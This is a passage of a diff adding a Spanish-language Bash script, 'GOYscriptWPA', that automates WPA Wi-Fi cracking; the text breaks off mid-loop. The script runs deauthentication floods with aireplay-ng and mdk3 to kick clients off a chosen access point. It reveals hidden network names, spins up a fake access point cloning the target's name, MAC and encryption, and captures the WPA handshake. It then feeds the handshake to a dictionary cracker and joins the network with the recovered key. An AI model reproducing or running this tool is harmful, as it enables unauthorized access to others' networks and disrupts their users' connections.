+#CANAL=${canales[$SELECCION]}
+#MAC_AP=${macs[$SELECCION]}
+TIPO=`grep -a "$MAC_AP" "$CAPTURA/wifis-01.csv"| sed -n 1p | awk -F ',' '{print $6}' | sed 's/ //g' | cut -c-4`
+CIFRADO=`grep -a "$MAC_AP" "$CAPTURA/wifis-01.csv"| sed -n 1p | awk -F ',' '{print $7}' | sed 's/ //g' | cut -c-4`
+CIFRADO=$TIPO-$CIFRADO
+echo -e "\a\033[1A\033[40C                "$grisC"" #BORRA EL MENSAJE DE "OPCIÓN NO VÁLIDA"
+MAC_GUIONES=`echo $MAC_AP | sed 's/:/-/g'`
+if [ "$NOMBRE_AP" = "< Oculta >" ]
+then
+	echo -e $rojoC
+	echo -e "Has seleccionado una red oculta."
+	echo -e "Hay que averiguar algunos datos antes de poder continuar."
+	echo -e $grisC
+	NOMBRE_AP=""
+	descubrir_red_oculta
+fi
+}
+
+#DESCUBRE LOS DATOS QUE FALTAN DE UNA RED OCULTA
+descubrir_red_oculta()
+{
+rm -rf "$CAPTURA"/red_oculta* > /dev/null 2>&1
+if [ "$CANAL" = "-" ] || [ $CANAL -lt 1 ] || [ $CANAL -gt 13 ] #SI EL CANAL NO ES VÁLIDO, SE BUSCA EL CANAL CORRECTO.
+then
+	echo -e $cyan"\r   Buscando CANAL... "$grisC" \c"
+	xterm $DEBUG -bg white -fg black $AIRODUMP_VENTANA -title "Buscando el canal de $MAC_AP" -e $AIRODUMP --bssid $MAC_AP -w "$CAPTURA/red_oculta_canal" $INTERFAZ_MONITOR &
+	CANAL=""
+	AIRODUMP_FUNCIONANDO=`ps $PARAMETRO_PS | grep airodump | grep -v grep`
+	while [ "$AIRODUMP_FUNCIONANDO" = "" ]
+	do
+		AIRODUMP_FUNCIONANDO=`ps $PARAMETRO_PS | grep airodump | grep -v grep`
+	done
+	while [[ "$CANAL" = "" ]] || [[ $CANAL -gt 13 ]] || [[ $CANAL -lt 1 ]]
+	do
+		if [ -e "$CAPTURA/red_oculta_canal-01.csv" ]
+		then
+			CANAL=`cat $CAPTURA/red_oculta_canal-01.csv | head -n 3 | tail -n 1 | awk -F ',' '{print $4}' | sed 's/ //g'`
+			NOMBRE_AP=`cat $CAPTURA/red_oculta_canal-01.csv | head -n 3 | tail -n 1 | awk -F ',' '{print $14}' | sed "s/^.\(.*\)/\1/"`
+		fi
+		AIRODUMP_FUNCIONANDO=`ps $PARAMETRO_PS | grep airodump | grep -v grep`
+		if [ "$AIRODUMP_FUNCIONANDO" = "" ]
+		then
+			break
+		fi
+	done
+	if [[ $CANAL -ge 1 ]] && [[ $CANAL -le 13 ]]
+	then
+		echo -e $verdeC"Encontrado: $blanco$CANAL"
+		echo -e $grisC
+		if [ "$NOMBRE_AP" != "" ]
+		then
+			echo -e $cyan"\r   Buscando NOMBRE DE RED...$verdeC Encontrado: $blanco\"$NOMBRE_AP\""
+			echo -e $grisC
+		fi
+	fi
+	killall -w airodump-ng > /dev/null 2>&1
+fi
+if [[ $CANAL -ge 1 ]] && [[ $CANAL -le 13 ]] && [[ "$NOMBRE_AP" = "" ]]
+then
+	echo -e $cyan"\r   Buscando NOMBRE DE RED... "$grisC" \c"
+	if [ "$NOMBRE_AP" = "" ]
+	then
+		xterm $DEBUG -bg white -fg black $AIRODUMP_VENTANA -title "Buscando el nombre de red de $MAC_AP" -e $AIRODUMP --bssid $MAC_AP -c $CANAL,$CANAL -w "$CAPTURA/red_oculta_nombre" $INTERFAZ_MONITOR &
+		NOMBRE_AP=""
+		CLIENTE=""
+		AIRODUMP_FUNCIONANDO=`ps $PARAMETRO_PS | grep airodump | grep -v grep`
+		while [ "$AIRODUMP_FUNCIONANDO" = "" ]
+		do
+			AIRODUMP_FUNCIONANDO=`ps $PARAMETRO_PS | grep airodump | grep -v grep`
+		done
+		while [ "$NOMBRE_AP" = "" ] #BUSCAMOS EL NOMBRE DE LA RED
+		do
+			if [ -e "$CAPTURA/red_oculta_nombre-01.csv" ]
+			then
+				NOMBRE_AP=`cat $CAPTURA/red_oculta_nombre-01.csv | head -n 3 | tail -n 1 | awk -F ',' '{print $14}' | sed "s/^.\(.*\)/\1/"`
+				CLIENTE=`cat $CAPTURA/red_oculta_nombre-01.csv | tail -n 2 | head -n 1 | awk -F ',' '{print $1}'`
+				if [ "$NOMBRE_AP" != "" ]
+				then
+					break
+				fi
+				SLEEP=`ps $PARAMETRO_PS | grep sleep | grep -v grep`
+				if [ "$CLIENTE" != "" ] && [ "$SLEEP" = "" ] #SI HAY UN CLIENTE CONECTADO LO EXPULSAMOS PARA CONSEGUIR EL NOMBRE AL RECONECTARSE
+				then
+					xterm $DEBUG -bg white -fg green $FUENTE $CLIENTE_VENTANA -title "ATAQUE -0 [Expulsando al cliente del AP]" -e $AIREPLAY -0 1 -a $MAC_AP -c $CLIENTE $INTERFAZ_MONITOR
+					CLIENTE=""
+					sleep 5 &
+				fi
+			fi
+			AIRODUMP_FUNCIONANDO=`ps $PARAMETRO_PS | grep airodump | grep -v grep`
+			if [ "$AIRODUMP_FUNCIONANDO" = "" ]
+			then
+				break
+			fi
+		done
+	fi
+	if [ "$NOMBRE_AP" != "" ] && [[ "$NOMBRE_AP" != '< Oculta >' ]]
+	then
+		echo -e $verdeC"Encontrado: $blanco\"$NOMBRE_AP\""
+		echo -e $grisC
+	fi
+	killall airodump-ng aireplay-ng > /dev/null 2>&1
+fi
+}
+
+#MUESTRA LOS DATOS CON LOS QUE SE VA A TRABAJAR
+mostrar_datos_seleccionados()
+{
+if [ "$FABRICANTE_INTERFAZ" = "" ]
+then
+	FABRICANTE_INTERFAZ=`$FABRICANTE "$MAC_INTERFAZ"`
+fi
+FABRICANTE_AP=`$FABRICANTE "$MAC_AP"`
+echo -e "$amarillo"
+echo -e "R E S U M E N"
+echo -e "═════════════"
+echo
+echo -e "  "$subrayar"INTERFAZ"$parpadeoOFF""$amarillo":"
+echo -e "    Nombre..........: $INTERFAZ"
+echo -e "    Modo monitor....: $INTERFAZ_MONITOR"
+echo -e "    MAC.............: $MAC_INTERFAZ"
+echo -e "    Fabricante......: $FABRICANTE_INTERFAZ"
+echo
+echo -e "  "$subrayar"PUNTO DE ACCESO"$parpadeoOFF""$amarillo":"
+echo -e "    Nombre..........: $NOMBRE_AP"
+echo -e "    MAC.............: $MAC_AP"
+echo -e "    Canal...........: $CANAL"
+echo -e "    Encriptación....: $CIFRADO"
+echo -e "    Fabricante......: $FABRICANTE_AP"
+echo -e "$grisC"
+
+rm -rf $CAPTURA/"$NOMBRE_AP ($MAC_GUIONES)"* > /dev/null 2>&1
+}
+
+#CAPTURAR TRÁFICO DE LA RED SELECCIONADA
+captura_de_paquetes()
+{
+if [ "$INTERFAZ_GRAFICA" = "SI" ]
+then
+	xterm $DEBUG $NORMAL $FUENTE $AIRODUMP_VENTANA -title "Capturando tráfico de \"$NOMBRE_AP\" #$CERO$NUM" -e $AIRODUMP --berlin 2 --bssid "$MAC_AP" -c $CANAL,$CANAL -w "$CAPTURA/$NOMBRE_AP ($MAC_GUIONES)" $INTERFAZ_MONITOR &
+else
+	$AIRODUMP --berlin 2 --bssid "$MAC_AP" -c $CANAL,$CANAL -w "$CAPTURA/$NOMBRE_AP ($MAC_GUIONES)" $INTERFAZ_MONITOR >/dev/null 2>&1 &
+fi
+}
+
+#SI EL TAMAÑO DEL ARCHIVO EN EL QUE GUARDAMOS LA CAPTURA ES MAYOR DEL TAMAÑO DETERMINADO, SE REINICIA
+controlar_tamano_captura()
+{
+sleep 2
+CAPTURANDO=`ps $PARAMETRO_PS | grep airodump-ng | grep -v grep`
+while [ ! "$CAPTURANDO" = "" ]
+do
+	SIZE_CAP=`ls -s "$CAPTURA/$NOMBRE_AP ($MAC_GUIONES)-$CERO$NUM.cap" | awk '{print $1}'`
+	if [ $SIZE_CAP -gt $MAXIMO_PESO_DE_LA_CAPTURA ]
+	then
+		echo > "$CAPTURA/REINICIANDO.goy"
+		echo -e $amarillo"\r\033[55C Reiniciando captura..."$grisC
+		killall airodump-ng > /dev/null 2>&1
+		sleep 2
+		NUM=$((NUM+1))
+		if [ $NUM -lt 10 ]
+		then
+			CERO="0"
+		else
+			CERO=""
+		fi
+		captura_de_paquetes &
+		sleep 2
+		rm -rf "$CAPTURA/REINICIANDO.goy"
+	fi
+	sleep 2
+	CAPTURANDO=`ps $PARAMETRO_PS | grep airodump-ng | grep -v grep`
+done
+}
+
+calcular_numero_archivo()
+{
+NUM=`ls -1 $CAPTURA/"$NOMBRE_AP ($MAC_GUIONES)"-*.cap | wc -l`
+if [ $NUM -lt 10 ]
+then
+	CERO="0"
+else
+	CERO=""
+fi
+}
+
+#SI HAY CLIENTES CONECTADOS LOS EXPULSAMOS PARA FORZAR LA RECONEXION
+forzar_handshake()
+{
+let INTENTO=0
+METODO_EXPULSION="$AIREPLAY"
+TIPO_AP="REAL"
+CLIENTE="" #INICIALIZAMOS LA VARIABLE EN LA QUE GUARDAREMOS LA MAC DEL CLIENTE
+CAPTURANDO=`ps $PARAMETRO_PS | grep airodump-ng | grep -v grep`
+while [ ! "$CAPTURANDO" = "" ] || [ -e "$CAPTURA/REINICIANDO.goy" ] #MIENTRAS AIRODUMP SIGA ACTIVO SE BUSCARAN CLIENTES ASOCIADOS
+do
+	calcular_numero_archivo
+	CLIENTES=`cat $CAPTURA/"$NOMBRE_AP ($MAC_GUIONES)"-$CERO$NUM.csv | grep -v WPA | grep $MAC_AP | awk -F ',' '{print $1}'` #TODOS LOS CLIENTES DETECTADOS
+	let CUANTOS_CLIENTES=`echo $CLIENTES | wc -w`
+	if [ "$CLIENTES" = "" ]
+	then
+		calcular_numero_archivo
+		SIZE_CAP=`ls -s "$CAPTURA/$NOMBRE_AP ($MAC_GUIONES)-$CERO$NUM.cap" | awk '{print $1}'`
+		if [ $SIZE_CAP -le 9 ] #PARA ALINEAR EL TAMAÑO EN KB A LA DERECHA
+		then
+			TAB="   "
+		else
+			if [ $SIZE_CAP -le 99 ]
+			then
+				TAB="  "
+			else
+				if [ $SIZE_CAP -le 999 ]
+				then
+					TAB=" "
+				else
+					TAB=""
+				fi
+			fi
+		fi
+		echo -e $cyan"\r${TAB}[ $SIZE_CAP KB ] Buscando clientes\033[K\c"
+		CONT=1
+		while [ $CONT -le 5 ]
+		do
+			echo -e ".\c"
+			if [ "$WRT" = "" ]
+			then
+				sleep 0.2
+			else
+				sleep 1
+			fi
+			let CONT=$CONT+1
+		done
+	else
+		let CAMBIO=$INTENTO%$CAMBIO_AP_REAL_FALSO # si el resto de la operación es 0 entonces toca cambiar de tipo de AP
+		if [ $CAMBIO -eq 0 ] && [ $INTENTO -ne 0 ]
+		then
+			if [ "$TIPO_AP" = "REAL" ]
+			then
+				echo -e $cyanC"Usando AP falso..."
+				crear_ap_falso &
+				TIPO_AP="FALSO"
+			else
+				echo -e $cyanC"Usando AP real..."
+				killall -q airbase-ng >/dev/null 2>&1
+				TIPO_AP="REAL"
+			fi
+		fi
+		HORA_EXPULSION=`date +%R`
+		let INTENTO=$INTENTO+1
+		if [ $CUANTOS_CLIENTES -eq 1 ]
+		then
+			echo -e "\r$blanco[$HORA_EXPULSION]$magentaC Encontrado 1 cliente. Expulsando... (intento nº $INTENTO)"
+		else
+			echo -e "\r$blanco[$HORA_EXPULSION]$magentaC Encontrados $CUANTOS_CLIENTES clientes. Expulsando... (intento nº $INTENTO)"
+		fi
+		if [ "$METODO_EXPULSION" = "$AIREPLAY" ]
+		then
+			expulsar_clientes_con_aireplay
+			METODO_EXPULSION="$MDK3"
+		else
+			expulsar_clientes_con_mdk3 &
+			METODO_EXPULSION="$AIREPLAY"
+		fi
+		let CONT=$SEGUNDOS_ENTRE_EXPULSIONES
+		CAPTURANDO=`ps $PARAMETRO_PS | grep airodump-ng | grep -v grep`
+		while [ $CONT -ge 1 ] && [ "$CAPTURANDO" != "" ]
+		do
+			calcular_numero_archivo
+			DATAS=`cat ./$CAPTURA/"$NOMBRE_AP ($MAC_GUIONES)"-$CERO$NUM.csv | grep "WPA"  | awk -F ',' '{print $11}' | sed 's/ //g' | sort | tail -n 1`
+			if [[ $DATAS -ne 0 ]]
+			then
+				if [ "$WRT" = "" ]
+				then
+					$WPACLEAN "$TMP/$NOMBRE_AP ($MAC_GUIONES).cap" "$CAPTURA/$NOMBRE_AP ($MAC_GUIONES)-$CERO$NUM.cap" >/dev/null 2>&1
+				else
+					cp "$CAPTURA/$NOMBRE_AP ($MAC_GUIONES)-$CERO$NUM.cap" "$TMP/$NOMBRE_AP ($MAC_GUIONES).cap"
+				fi
+				HANDSHAKES=`$AIRCRACK "$TMP/$NOMBRE_AP ($MAC_GUIONES).cap" | grep " handshake)" | awk '{print substr ($0,56,13)}' 2>/dev/null`
+			fi
+			SIZE_CAP=`ls -s "$CAPTURA/$NOMBRE_AP ($MAC_GUIONES)"-$CERO$NUM.cap | awk '{print $1}'`
+			if [ $SIZE_CAP -le 9 ] #PARA ALINEAR EL TAMAÑO EN KB A LA DERECHA
+			then
+				TAB="   "
+			else
+				if [ $SIZE_CAP -le 99 ]
+				then
+					TAB="  "
+				else
+					if [ $SIZE_CAP -le 999 ]
+					then
+						TAB=" "
+					else
+						TAB=""
+					fi
+				fi
+			fi
+			if [ $CONT -eq 1 ]
+			then
+				echo -e $cyan"\r${TAB}[ $SIZE_CAP KB ] Esperando $CONT segundo...   $blanco $HANDSHAKES  \033[K\c"$grisC
+			else
+				if [ $CONT -lt 10 ]
+				then
+					echo -e $cyan"\r${TAB}[ $SIZE_CAP KB ] Esperando $CONT segundos...  $blanco $HANDSHAKES  \033[K\c"$grisC
+				else
+					echo -e $cyan"\r${TAB}[ $SIZE_CAP KB ] Esperando $CONT segundos... $blanco $HANDSHAKES  \033[K\c"$grisC
+				fi
+			fi
+			if [ "$HANDSHAKES" = "(1 handshake)" ] #SI YA TENEMOS EL HANDSHAKE SALIMOS DEL BUCLE
+			then
+				echo -e $grisC
+				break
+			fi
+			CAPTURANDO=`ps $PARAMETRO_PS | grep airodump-ng | grep -v grep`
+			sleep 1
+			let CONT=$CONT-1
+		done
+		if [ "$HANDSHAKES" != "(1 handshake)" ]
+		then
+			echo -en "\r$rojoC  No se ha podido obtener el handshake.\033[K"
+		fi
+		echo -e $grisC
+		echo -e $grisC
+	fi
+	calcular_numero_archivo
+	DATAS=`cat ./$CAPTURA/"$NOMBRE_AP ($MAC_GUIONES)"-$CERO$NUM.csv | grep "WPA"  | awk -F ',' '{print $11}' | sed 's/ //g' | sort | tail -n 1`
+	if [[ $DATAS -ne 0 ]]
+	then
+		if [ "$WRT" = "" ]
+		then
+			$WPACLEAN "$TMP/$NOMBRE_AP ($MAC_GUIONES).cap" "$CAPTURA/$NOMBRE_AP ($MAC_GUIONES)-$CERO$NUM.cap" >/dev/null 2>&1
+		else
+			cp "$CAPTURA/$NOMBRE_AP ($MAC_GUIONES)-$CERO$NUM.cap" "$TMP/$NOMBRE_AP ($MAC_GUIONES).cap"
+		fi
+		HANDSHAKES=`$AIRCRACK "$TMP/$NOMBRE_AP ($MAC_GUIONES).cap" | grep " handshake)" | awk '{print substr ($0,56,13)}' 2>/dev/null`
+	fi
+	if [ "$HANDSHAKES" = "(1 handshake)" ] #SI YA TENEMOS EL HANDSHAKE SALIMOS DEL BUCLE
+	then
+		mv "$TMP/$NOMBRE_AP ($MAC_GUIONES).cap" "./handshakes" #mueve la captura con el handshake a la carpeta "handshakes"
+		MAC_HANDSHAKE=`$AIRCRACK "handshakes/$NOMBRE_AP ($MAC_GUIONES).cap" | grep "(1 handshake)" | awk '{print substr ($0,7,17)}'`
+		echo -e $verdeC"HANDSHAKE CONSEGUIDO PARA $blanco$MAC_HANDSHAKE$grisC"
+		rm -rf "$CAPTURA/$NOMBRE_AP ($MAC_GUIONES)*"  > /dev/null 2>&1
+		break
+	fi
+	CAPTURANDO=`ps $PARAMETRO_PS | grep airodump-ng | grep -v grep`
+done
+}
+
+#EXPULSA LOS CLIENTES HACIENDO USO DE AIREPLAY
+expulsar_clientes_con_aireplay()
+{
+let CONT=1
+while [ $CONT -le $CUANTOS_CLIENTES ]
+do
+	CLIENTE=`echo $CLIENTES | awk '{print $'$CONT'}'`
+	CLIENTE_FABRICANTE=`$FABRICANTE "$CLIENTE"`
+	echo -en "\r$verdeC  Expulsando con aireplay $CLIENTE [$CLIENTE_FABRICANTE]\033[K"
+	echo -e $grisC
+	if [ "$INTERFAZ_GRAFICA" = "SI" ]
+	then
+		xterm $DEBUG $BIEN $FUENTE $CLIENTE_VENTANA -title "ATAQUE -0 [Expulsando al cliente del AP]" -e $AIREPLAY -0 1 -a $MAC_AP -c $CLIENTE $INTERFAZ_MONITOR
+	else
+		$SCREEN -dm -t "Expulsando_aireplay" $AIREPLAY -0 1 -a $MAC_AP -c $CLIENTE $INTERFAZ_MONITOR
+	fi
+	let CONT=$CONT+1
+done
+}
+
+#EXPULSA LOS CLIENTES HACIENDO USO DE MDK3
+expulsar_clientes_con_mdk3()
+{
+rm -rf $TMP/*.mdk3 >/dev/null 2>&1
+MAC_INTERFAZ=`ifconfig "$INTERFAZ" | grep -oE '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' | awk '{print toupper($0)}'` #extraemos la MAC de la interfaz del comando 'ifconfig'
+echo "$CLIENTES" > "$TMP/lista_negra.mdk3"
+echo -en "\r$amarillo  Expulsando todos los clientes de $MAC_AP con mdk3\033[K"
+echo -e $grisC
+if [ "$INTERFAZ_GRAFICA" = "SI" ]
+then
+	xterm $DEBUG $BIEN $FUENTE $CLIENTE_VENTANA -title "MDK3 [Expulsando clientes del AP]" -e $MDK3 $INTERFAZ_MONITOR d -b "$TMP/lista_negra.mdk3" -c $CANAL -s 150 &
+else
+	$SCREEN -dm -t "Expulsando_mdk3" $MDK3 $INTERFAZ_MONITOR d -b "$TMP/lista_negra.mdk3" -c $CANAL -s 150 >/dev/null 2>&1 &
+fi
+sleep $SEGUNDOS_ENTRE_EXPULSIONES
+killall -q -w mdk3 >/dev/null 2>&1
+}
+
+#ESPERA A QUE SE GENERE EL ARCHIVO .CSV PARA CONTINUAR
+esperar_csv()
+{
+echo -e $cyan"Esperando a que se genere el archivo .CSV...\c"
+let CONTADOR=1
+while [ ! -e $CAPTURA/"$NOMBRE_AP ($MAC_GUIONES)"-01.csv ]
+do
+	echo -e ""$cyan".\c"
+	if [ "$WRT" = "" ]
+	then
+		sleep 0.2
+	else
+		sleep 1
+	fi
+	let CONTADOR=$CONTADOR+1
+	if [ $CONTADOR -gt 15 ]
+	then
+		echo -en ""$cyan"\a\033[15D\033[K"
+		let CONTADOR=1
+	fi
+done
+echo -en $cyan"\r\033[K"
+}
+
+
+#DESACTIVAR EL MODO MONITOR EN LA INTERFAZ VIRTUAL MON0
+desactivar_modo_monitor()
+{
+echo -e ""$cyan"Desactivando modo monitor..."$grisC""
+echo
+$AIRMON stop $INTERFAZ > /dev/null 2>&1
+$AIRMON stop mon0 > /dev/null 2>&1
+}
+
+comprobar_ayuda()
+{
+echo -e $blanco
+echo "GOYscriptWPA $VERSION by GOYfilms"
+echo -e $grisC
+echo "Modo de uso: $0 [interfaz] [opciones]"
+echo
+echo "OPCIONES:"
+echo "    -l, -L   :Usar la lista de redes detectadas la última vez"
+echo "    --datos  :Pasar como parámetros todos los datos necesarios"
+echo "              en el siguiente orden:"
+echo "              BSSID ESSID CANAL CIFRADO INTERFAZ"
+echo
+echo "Ejemplos: $0"
+echo "          $0 wlan1"
+echo "          $0 wlan0 -l"
+echo "          $0 -L"
+echo "          $0 --datos 01:23:45:67:89:AB mi_casa 5 WPA-TKIP wlan0"
+echo -e "$grisC"
+exit 1
+}
+
+buscar_clave()
+{
+echo "$HANDSHAKE" | awk -F '/' '{print $NF}' > "$TMP/handshakes.lst"
+echo "(Diccionario automatico).dic" > "$TMP/diccionarios.lst"
+./goyscriptDIC --directo "$MAC_AP" "$NOMBRE_AP"
+}
+
+#ESPERA A QUE SE PULSE UNA TECLA
+pulsar_una_tecla()
+{
+echo
+echo -e $blanco"$1"$grisC" \c"
+read -n 1 TECLA
+echo
+echo
+if [ "$1" = "Pulsa una tecla para salir..." ]
+then
+	exit 1
+fi
+}
+
+conectar_internet()
+{
+echo -en ""$cyan"¿Quieres conectarte a la red \"$NOMBRE_AP\"? [S/N]: ""$amarillo\c"
+read -n 1 RESPUESTA
+while [ "$RESPUESTA" != "s" ] && [ "$RESPUESTA" != "n" ] && [ "$RESPUESTA" != "S" ] && [ "$RESPUESTA" != "N" ]
+do
+	echo -en ""$rojoC"  OPCIÓN NO VÁLIDA  "
+	sleep 1
+	echo -en "$cyan""\r"¿Quieres conectarte a la red \"$NOMBRE_AP\"? [S/N]: "$amarillo\033[K\c"
+	read -n 1 RESPUESTA
+done
+if [ "$RESPUESTA" = "s" ] || [ "$RESPUESTA" = "S" ]
+then
+	echo -en "$cyan""\r"¿Quieres conectarte a la red \"$NOMBRE_AP\"? [S/N]: $amarillo"SÍ"
+	echo -e "$cyan\n"
+	echo -e "Configurando la tarjeta WiFi para conectarse a la red \"$NOMBRE_AP\"..."$grisC""
+	echo
+	killall -q dhcpcd dhclient udhcpc wpa_supplicant > /dev/null 2>&1
+	desactivar_todos_monX
+	LINEAS_CLAVE=$(cat "$ARCHIVO_CLAVE" | wc -l)
+	if [ $LINEAS_CLAVE -eq 2 ] #SI EL TXT QUE CONTIENE LA CONTRASEÑA TIENE 2 LINEAS ES PORQUE SE DESENCRIPTÓ CON goyscriptWPS sinó con goyscriptWPA
+	then
+		CLAVE_WPA=$(cat "$ARCHIVO_CLAVE" | sed -n 2p | awk -F "'" '{print $2}')
+	else
+		CLAVE_WPA=$(cat "$ARCHIVO_CLAVE")
+	fi
+	$WPA_PSK_RAW "$NOMBRE_AP" "$CLAVE_WPA" > "./$TMP/internet.conf"
+	wpa_supplicant -B -D wext -i $INTERFAZ -c "./$TMP/internet.conf"
+	sleep 1
+	echo -e ""$cyan"Iniciando cliente DHCP. Puede llevar un tiempo, ten paciencia..."$grisC"\n"
+	which dhclient > /dev/null 2>&1
+	if [ $? -eq 0 ]
+	then
+		dhclient -r
+		dhclient $INTERFAZ
+	else
+		which dhcpcd > /dev/null 2>&1
+		if [ $? -eq 0 ]
+		then
+			dhcpcd $INTERFAZ > /dev/null 2>&1
+		else
+			echo -e $rojoC"No se ha encontrado ningún cliente DHCP instalado."
+			echo -e $rojoC"No se ha podido realizar la conexión."
+			echo -e $grisC
+			matar_procesos "Cerrando los procesos abiertos..."
+			pulsar_una_tecla "Pulsa una tecla para salir..."
+		fi
+	fi
+	if [ $? != 0 ] #SI NO VA A LA SEGUNDA NO CREO QUE VAYA BIEN LA COSA :D
+	then
+		echo -e "$rojoC"
+		echo "No ha sido posible realizar la conexión."
+		echo "Probablemente estás demasiado lejos del punto de acceso."
+		echo -e "$grisC"
+	else
+		echo -e $verdeC"Configuración finalizada. Comprueba si tienes conexión."
+		echo -e "$grisC"
+		which firefox > /dev/null 2>&1
+		if [ $? -eq 0 ]
+		then
+			$(which firefox) www.google.es & > /dev/null 2>&1
+			echo -e "$verdeC"
+			echo "Abriendo \"Firefox\"..."
+			echo -e "$grisC"
+		else
+			which konqueror > /dev/null 2>&1
+			if [ $? -eq 0 ]
+			then
+				$(which konqueror) www.google.es & > /dev/null 2>&1
+				echo -e "$verdeC"
+				echo "Abriendo \"Konqueror\"..."
+				echo -e "$grisC"
+			else
+				echo -e $rojoC"No tienes instalado \"Firefox\" ni \"Konqueror\"."
+				echo -e "Si tienes algún otro navegador ejecútalo."
+				echo -e $grisC
+			fi
+		fi
+		echo -en $blanco"Pulsa \"D\" para desconectarte de $cyanC\"$NOMBRE_AP\"$blanco... $amarillo"
+		read -n 1 TECLA
+		while [[ "$TECLA" != "D" ]] && [[ "$TECLA" != "d" ]]
+		do
+			echo -en $rojoC"      OPCIÓN NO VÁLIDA  "
+			sleep 1
+			echo -en $blanco"\rPulsa \"D\" para desconectarte de $cyanC\"$NOMBRE_AP\"$blanco... $amarillo\033[K"
+			read -n 1 TECLA
+		done
+		echo -e $grisC
+		matar_procesos "Desconectando de $blanco\"$NOMBRE_AP\"$cyanC..."
+	fi
+else
+	echo -en "$cyan""\r"¿Quieres conectarte a la red \"$NOMBRE_AP\"? [S/N]: $amarillo"NO"
+fi
+echo -e "$grisC"
+echo
+}
+
+comprobar_distribucion()
+{
+DISTRIBUCION=$(./software/./distro_linux.sh)
+case "$DISTRIBUCION" in
+"<Desconocida>")
+	echo -e $rojoC"Distribución de Linux desconocida$grisC"
+	echo -e $grisC;;
+*)
+	echo -e $verdeC"Distribución de linux detectada: $blanco$DISTRIBUCION"
+	echo -e $grisC;;
+esac
+}
+
+comprobar_permisos_solo_lectura()
+{
+rm -rf "prueba_permisos" > /dev/null 2>&1
+mkdir "prueba_permisos" > /dev/null 2>&1
+if [ $? -ne 0 ]
+then
+	echo -e $grisC
+	echo -e $rojoC"  ERROR: El dispositivo está montado como sólo lectura"
+	echo -e $cyanC"         Prueba a volver a montarlo con:"
+	echo -e $cyanC"         mount -o remount,rw <punto_de_montaje>"
+	echo -e $grisC
+	echo -e $cyanC"         Ejemplo:"
+	echo -e $cyanC"             mount -o remount,rw /mnt/sdb1"
+	echo -e $grisC
+	pulsar_una_tecla "Pulsa una tecla para salir..."
+else
+	rm -rf "prueba_permisos" > /dev/null 2>&1
+fi
+}
+
+#CREA UN PUNTO DE ACCESO FALSO IDÉNTICO AL REAL
+crear_ap_falso()
+{
+case $CIFRADO in #para configurar el AP falso con la misma encriptación que el AP real
+"WPA-WEP")
+	TIPO_CIF="-z 1";;
+"WPA-TKIP" | "WPA-" )
+	TIPO_CIF="-z 2";;
+"WPA-WRAP")
+	TIPO_CIF="-z 3";;
+"WPA-CCMP")
+	TIPO_CIF="-z 4";;
+"WPA-WEP1")
+	TIPO_CIF="-z 5";;
+"WPA2-WEP")
+	TIPO_CIF="-Z 1";;
+"WPA2-TKIP")
+	TIPO_CIF="-Z 2";;
+"WPA2-WRAP")
+	TIPO_CIF="-Z 3";;
+"WPA2-CCMP")
+	TIPO_CIF="-Z 4";;
+"WPA2-WEP1")
+	TIPO_CIF="-Z 5";;
+*) #por si acaso
+	TIPO_CIF="-Z 4";;
+esac
+if [ "$INTERFAZ_GRAFICA" = "SI" ]
+then
+	xterm $DEBUG -title "Falso AP" -iconic -e "$AIRBASE" -c $CANAL -e "$NOMBRE_AP" $TIPO_CIF -a "$MAC_AP" $INTERFAZ_MONITOR &
+else
+	"$AIRBASE" -c $CANAL -e "$NOMBRE_AP" $TIPO_CIF -a "$MAC_AP" $INTERFAZ_MONITOR >/dev/null 2>&1 &
+fi
+}
+
+comprobar_root()
+{
+USUARIO=`whoami`
+if [ "$USUARIO" != "root" ]
+then
+	echo -e $grisC
+	echo -e $rojoC"ERROR: Necesitas permisos de root para poder"
+	echo -e $rojoC"       ejecutar este script"
+	echo -e $grisC
+	pulsar_una_tecla "Pulsa una tecla para salir..."
+fi
+}
+
+
+##### PROGRAMA PRINCIPAL #####
+
+version
+comprobar_permisos_solo_lectura
+if [ "$WRT" = "" ]
+then
+	comprobar_root
+fi
+INTERFAZ_GRAFICA=`ps $PARAMETRO_PS | grep -e goyscriptTTY -e goyscriptWRT | grep -v grep`
+if [ "$INTERFAZ_GRAFICA" = "" ]
+then
+	INTERFAZ_GRAFICA="SI"
+else
+	INTERFAZ_GRAFICA="NO"
+fi
+if [ "$1" == "--help" ] || [ "$1" == "--ayuda" ] || [ "$1" == "/?" ]
+then
+	comprobar_ayuda
+fi
+
+if [ "$1" != "--datos" ]
+then
+	REST=`ps $PARAMETRO_PS | grep "restaurar_" | grep -v grep`
+	while [ "$REST" != "" ] #espera a que termine el script de restaurar los servicios (por si se ejecuta la suite dos veces muy seguidas)
+	do
+		REST=`ps $PARAMETRO_PS | grep "restaurar_"`
+	done
+	DESDE_DATOS="NO"
+	matar_procesos " Iniciando..."
+	comprobar_distribucion
+	if [[ -e "/sys/class/net/$1/device/driver" ]]  #Para controlar si existe la interfaz pasada como parametro.
+	then                                           #Si no existe, muestra las que hay para que seleccionemos una
+		INTERFAZ=$1
+	else
+		seleccionar_tarjeta
+	fi
+	borrar_sesiones_anteriores
+	if [ "$INTERFAZ_GRAFICA" = "SI" ]
+	then
+		mostrar_resolucion_de_pantalla
+	fi
+	iniciar_tarjeta
+	activar_modo_monitor
+	LISTA=`echo "$*" | grep -w -e "-l" -e "-L"` # PARA CONTROLAR SI SE USÓ EL PARÁMETRO INDICADO
+	if [ "$LISTA" != "" ] && [ -e "./$CAPTURA/redes_wpa.goy" ]
+	then
+		echo -e $cyanC"Se usará la lista de redes detectadas anteriormente."$grisC
+		echo
+		mv "$CAPTURA/anteriorCSV.wifis-wpa-clientes" "$CAPTURA/clientes_wpa.csv" > /dev/null 2>&1
+		sleep 1
+	else
+		buscar_redes
+	fi
+else
+	DESDE_DATOS="SI"
+	MAC_AP="$2"
+	NOMBRE_AP="$3"
+	CANAL="$4"
+	CIFRADO="$5"
+	INTERFAZ="$6"
+	MAC_GUIONES=`echo "$MAC_AP" | sed 's/:/-/g'`
+fi
+
+nohup software/./restaurar_servicios.sh $$ >/dev/null 2>&1 & #inicia en segundo plano el script para restaurar los servicios al finalizar goyscript
+while true
+do
+	if [ "$1" != "--datos" ]
+	then
+		seleccionar_red
+	fi
+	if [[ $CANAL -ge 1 ]] && [[ $CANAL -le 13 ]] && [[ "$NOMBRE_AP" != "" ]] #COMPRUEBA QUE LOS DATOS SON CORRECTOS PARA CONTINUAR
+	then
+		rm -rf "$CAPTURA/$NOMBRE_AP ($MAC_GUIONES)"*
